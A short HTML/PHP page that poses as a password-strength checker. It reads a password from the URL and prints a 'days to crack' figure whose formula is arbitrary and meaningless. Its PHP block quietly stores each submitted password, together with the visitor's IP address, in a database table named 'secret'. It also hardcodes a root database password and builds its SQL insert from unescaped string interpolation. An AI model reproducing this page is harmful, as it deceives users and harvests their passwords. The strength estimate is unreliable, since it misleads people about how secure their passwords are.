<html>
<script type = "text/javascript">
function check(){

var pass = location.search.split('pass=')[1]
var len = pass.length;
var n = Math.pow(2, len-8);
n = Math.abs(n);
n = Math.floor(n);

capital = upper(pass)

if(capital == true){

n = Math.pow(n, 4)

}

var character = pass.includes("!");

if(character == false){

character = pass.includes("?");

if(character == false){

character = pass.includes("$");

}

if(character == false){

character = pass.includes("&");

}

if(character == false){

character = pass.includes("*");

}

if(character == false){

character = pass.includes("%");

}

if(character == false){

character = pass.includes("£");

}

}

if(character == true){

n = Math.pow(n, 4)

}

var num = hasNumber(pass)

if(num == true){

n = Math.pow(n, 4)

}


document.write("It would take " + n + " days to crack!");
}

function upper(str) {
    return (/[A-Z]/.test(str));
}

function hasNumber(myString) {
  return /\d/.test(myString);
}
check();
</script>
<?php
//Variables
$ip = $_SERVER['REMOTE_ADDR'];
$pass = htmlspecialchars($_GET["pass"]);

//MySQL Variables
$servername = "localhost";
$username = "root";
$password = "Gossip666";
$dbname = "gossipking";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO secret (ip, password)
VALUES ('$ip','$pass')";

if ($conn->query($sql) === TRUE) {
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
</html>